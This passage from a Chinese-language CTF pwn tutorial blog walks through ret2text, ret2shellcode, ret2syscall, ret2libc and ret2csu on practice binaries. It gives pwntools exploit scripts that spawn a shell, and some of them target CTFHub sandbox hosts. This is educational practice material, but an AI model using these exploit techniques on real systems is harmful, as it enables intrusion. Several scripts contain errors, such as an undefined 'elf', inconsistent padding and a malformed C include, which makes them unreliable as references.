src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>而后我们在secure中可以找到调用<code>system(&#39;&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这个指令，就可以获得系统的shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>查看代码地址为0x0804863A，接下来构造playload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>来自CTFHUB的ret2text ，我不知道怎么复制题目链接，自己点进去找叭<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>查看文件信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>拖进32位IDA反编译发现main函数存在gets栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12打开字符串窗口发现&#x2F;bin&#x2F;sh语句</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>去到对应的语句部分可以发现该程序将&#x2F;bin&#x2F;sh放到了rdi后，并且调用了sysytem</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64位系统中rdi，rsi，rdx，rcx，r8，r9作为调用函数的前6个参数，如果参数多于6个，其余参数放入栈中。与此对比，32位系统中由于寄存器有限，调用函数时参数都放入栈中</p></blockquote><p>找一个变量双击可以看到各个变量对应的虚拟内存地址，构造playload就可以先用0x70个自节填满s变量，再用8个字节填满r，最后加上&#x2F;bin&#x2F;sh的地址。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>‘+4’ 是因为32位程序要覆盖的ebp是四个字节，64位程序需要覆盖八字节的rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>就是篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址。我们可以利用pwntools中的shellcraft.sh()编写shellcode。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h4 id="🌰-1-1"><a href="#🌰-1-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载题目: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>进入main函数反编译一下：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>发现gets和strncpy存在栈溢出漏洞，但系统没有现成的‘bin&#x2F;sh’指令给我们用。我们要自己写🥲</p><p>那怎么写呢？这时就要请出我们的得力助手pwntools，在pwntools下可以自动生成shellcode脚本。</p><p>gets获得输入的s变量，并将其复制到buf2处。双击buf2可以跳转到其所在位置，我们发现buf2在.bss段，所在段地址为0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>调试下程序，看看这一个 bss 段是否可执行，显示rwxp就是可以。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>有权限就意味着我们可以将shellcode通过strncpy函数放进buf2这个区域，在触发溢出后将返回地址指向buf2这里即可拿到shell。</p><p>确定要覆盖的 return address 的偏移量相对于栈顶为 112 个字节。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-1"><a href="#🌰-2-1" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>还是CTFHub的题目。放进ubuntu查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledz，即将shellcode放在数据段，即可执行</p><p>出现了一个新的变量RWX！</p><p>用IDA反编译题目main函数发现栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>我们可以知道buf相对于ebp的偏移量是0x10，所以我们需要填充(0x10+8)的数据。</p><p>双击buf查看程序中的变量信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>r即为返回地址，有0x8的偏移量，所以总共需要填充的数据长度是 (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>这也太深奥了没搞懂，有缘再说</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即控制程序执行系统调用，从而获取shell。前提是程序需要有int 0x80这样的系统调用的gadget.</p><p>在ret2shellcode的情境下，如果开启了NX，那我们写到栈中的shellcode就会被CPU报错而不可执行。这种情况下，我们可以尝试使用ret2syscall的方法。</p><p>ret2syscall就是指通过手机带有ret指令的指令片段拼接成我们需要的shellcode。</p><blockquote><p>ret 指令可以理解为取栈顶的数据作为下次跳转的位置，即 eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>或者理解为 pop eip，jmp   </p><p>取栈顶数据作为下次跳转的位置，然后跳转;</p><p>同理call也可以理解为 push rip, jmp  </p><p>将call指令的下一条指令地址压入栈，然后跳转</p></blockquote><h4 id="🌰"><a href="#🌰" class="headerlink" title="🌰:"></a>🌰:</h4><p> bamboofox 中的 ret2syscall </p><p>首先检测程序开启的保护：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>查看其源码寻找利用点：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main 函数里有 gets 可以实现栈溢出，计算偏移量为112。</p><p>接下来进行系统调用构造，利用ROPgadget查找对应的gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>选择0x080bb196的这段</p><p>同样，找到其他的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>这里可以同时控制三个寄存器，我们选它</p><p>选好所有的gadgets就拼接起来构造payload就好喽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //这文件我直接拖进去的文件地址好长<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="关于linux系统调用的实现"><a href="#关于linux系统调用的实现" class="headerlink" title="关于linux系统调用的实现"></a>关于linux系统调用的实现</h4><h5 id="系统调用的步骤"><a href="#系统调用的步骤" class="headerlink" title="系统调用的步骤"></a>系统调用的步骤</h5><p>Linux的系统调用需要通过 int 80 实现，用系统调用号来区分入口函数。操作系统实现调用的基本过程如下：</p><ul><li>应用程序调用库函数</li><li>API将系统调用号存入EAX，然后通过中断调用时系统进入内核态</li><li>内核中的中断处理函数根据系统调用号，调用到对应的内核函数（系统调用）</li><li>系统调用完成相应的功能，将返回值存入EAX，返回到中断处理函数</li><li>中断处理函数返回到API</li><li>API将EAX返回给应用程序</li></ul><blockquote><p>系统调用号：</p><p>在Linux系统中，每个系统调用都被赋予一个系统调用号。系统调用号一旦分配就不能再有任何变更，否则编译好的应用程序就会崩溃；此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用。这样，通过系统调用号就可以关联系统调用。</p><p>比如32位下调用 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) ，Linux系统调用通过int 0x80指令开始系统调用，exceve对应的系统调用号是0xb</p></blockquote><h5 id="举个栗子🌰："><a href="#举个栗子🌰：" class="headerlink" title="举个栗子🌰："></a>举个栗子🌰：</h5><p>函数<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>其函数调用过程应该是：</p><ul><li>系统调用号存入EAX，即eax应该是0xb</li><li>依次传入三个参数，即ebx指向&#x2F;bin&#x2F;sh的地址或者sh的地址；ecx为0；edx为0</li></ul><p>我们可以知道系统在调用时会用到eax，ebx，ecx，edx四个寄存器，那么我们就可以将以上的内容写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要把对应的参数放到相应的寄存器中，再执行int 0x80就可以执行相应的系统调用。</p><p>那该怎么控制呢？🤨 <del>把刀架在寄存器脖子上</del></p><p>我们们可以使用pop和ret指令组合来控制寄存器的值以及执行方向。</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>ROPgadget和ropper，两个都可可以找，目标汇编代码片段，ROPgadget速度更快但是查找结果并不完整；ropper速度相对较慢但查找结果精准。</p><p>对于静态生成的程序，我们可以不用每一次都一条一条的去找命令，可以直接生成一条ROP链</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc即控制函数执行libc中的函数，通常是返回值某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，我们需要知道 system 函数的地址。</p><h4 id="🌰-1-2"><a href="#🌰-1-2" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>CTF Wiki 的题，超简单的所有信息都给出的新手题目 <del>我都会做</del></p><p>首先查看安全保护</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>源程序为 32 位，开启了 NX 保护。看一下程序源代码，确定栈溢出利用位置</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>gets可以栈溢出。</p><p>我们可以找到system函数和’bin&#x2F;sh’字符串</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>我们就可以直接返回 system 的地址</p><p>计算偏移量为112，构造payload。需要注意，我们调用system函数，会有一个对应的四字节的返回地址，我们需要将其填充后再附上我们的 ‘&#x2F;bin&#x2F;sh’ 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-2"><a href="#🌰-2-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>同样是32位的程序开启NX保护，有一个gets可以利用。有system函数但没有 ‘&#x2F;bin&#x2F;sh’ 字符串，但是有一个gets()函数，我们可以自己读取。同时我们在.bss段发现一个buf可以传参，可以把字符串填在这里</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>编写exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payload解释：</p><ul><li><code>&#39;A&#39;*112</code>：填充112个字符’A’溢出缓冲区，覆盖返回地址。</li><li><code>gets_addr</code>：将<code>gets</code>函数的地址作为原本程序的gets()函数的返回地址，控制程序流程跳转到<code>gets</code>函数。</li><li><code>sys_addr</code>：<code>system</code>函数的地址，将作为<code>gets</code>函数返回后的下一个地址，控制程序流程跳转到<code>system</code>函数。</li><li><code>buf_addr</code>：缓冲区的地址，作为<code>system</code>函数的参数，传递给<code>system</code>函数的命令字符串所在的内存地址。</li><li><code>buf_addr</code>：再次使用缓冲区的地址，作为<code>gets</code>函数的参数，使得<code>gets</code>函数将用户输入的命令字符串写入到缓冲区。</li></ul><h4 id="🌰-3"><a href="#🌰-3" class="headerlink" title="🌰_3:"></a>🌰_3:</h4><p>这次system也没了🤨，其他的保护和漏洞都和例一例二一样。除此之外，题目中又给了一个 libc.so 动态链接库。</p><p>那怎么得到system的地址呢？</p><p>补课时间到！</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>除此之外我们还要知道，A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 基地址。也就是说，<strong>B的真实地址&#x3D;基地址+B的偏移地址</strong>。</p><p><strong>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</strong></p><p>那该如何获得已知函数的地址呢？</p><p>got表泄露！输出某个函数对应的got表内容，注意libc的延迟绑定机制，got表中只有已经执行过的函数有真实地址，我们需要泄露已经执行过的函数地址。再在程序中查询偏移进一步获得system地址。</p><p>但是！这样太麻烦啦我们可以用工具：<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>了解ret2csu之前先了解一下attached code的概念。</p><p>我们编译一个简单的只有一个main函数的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看可执行文件的函数符号：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>可以发现除了 main 函数还有很多其它函数，这些函数是编译器附加到可执行文件中的，称之为 attached code 。这些 attached code 在main 函数之前执行，负责加载或者链接库文件。我们可以从 attached code 中寻找可以利用的 gadgets。</p><p>我们利用 <code>objdum -D [filename] </code>命令查看文件反汇编代码可以看到 <code>__libc_csu_init()</code> 函数中存在以下gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 <code>__libc_csu_init</code> 中的 gadgets。我们可以在执行完第二个gadget后ret到第一个gadget，这样就可以控制很多关键寄存器的值。</p><p>需要注意的是，这种方法不能控制rax的值，也就无法进行系统调用，因为系统调用号在rax里。但我们可以通过write等函数泄露got表中的函数地址，然后计算出libc地址。</p><p>有以下几种利用场景：</p><ul><li>ret2csu泄露libc地址后利用libc中的gadget</li><li>ret2csu配合pop rax;syscall;等gadget直接getshell</li><li>开启pie的情况下，利用offset2lib进行ret2csu,或者直接利用libc中的gadget getshell</li></ul><blockquote><p>offset2lib简单来说就是泄露任意代码段地址即可推得所有共享库地址,因为共享库之间的offset是固定的.</p></blockquote><h4 id="🌰-1-3"><a href="#🌰-1-3" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>题目链接：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5。</a></p><p>题目没有开启pie和canary保护。</p><p>蒸米师傅给了源码，我们自己拖到 ida 里也能判断出代码的基本逻辑，main() 函数里还有一个 <code>vulnerable_function()</code> 函数 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>在read处有明显的栈溢出可以利用。<code>.plt</code> 表里就只有write函数和read函数。</p><p>我们的目的是调用 <code>system(&quot;/bin/sh&quot;)</code> ，可以先泄露出libc函数的地址，用write打印出来，通过计算偏移就可以求出system函数的地址。然后使用read函数将真实的system函数地址和&#x2F;bin&#x2F;sh字符串写入bss段，最后调用system函数即可。</p><p>我们知道在64位的程序中，前六个参数使用寄存器RDI, RSI, RDX, RCX, R8和 R9传递</p><p>在__libc_csu_init()函数中有可以利用的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>我们控制rbx,rbp,r12,r13,r14和r15的值，再将r15的值赋值给rdx，r14的值赋值给rsi，r15的值赋值给edi。简单来说对应关系就是:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>随后就会调用 <code>call qword ptr [r12+rbx*8]</code> 。这条指令的含义是向 <code>[r12+rbx*8]</code> 间接寻址，跳转到所指的函数地址。我们就可以将rbx赋值为0，这样的寻址结果就是r12所指向的地址。</p><p>接下来的汇编代码片段含义为：执行call指令结束后，程序对rbx加一，然后对比rbx和rbp的值，如果相等就会继续向下执行。为了让rbx和rbp相等，我们需要将rbp赋值为1。</p><ul><li>payload-1</li></ul><p>利用 <code>read()</code> 读入我们的payload，<code>write()</code> 输出其got表中的地址。除了泄露地址，为了返回到原程序中重复利用 <code>buffer overflow</code> 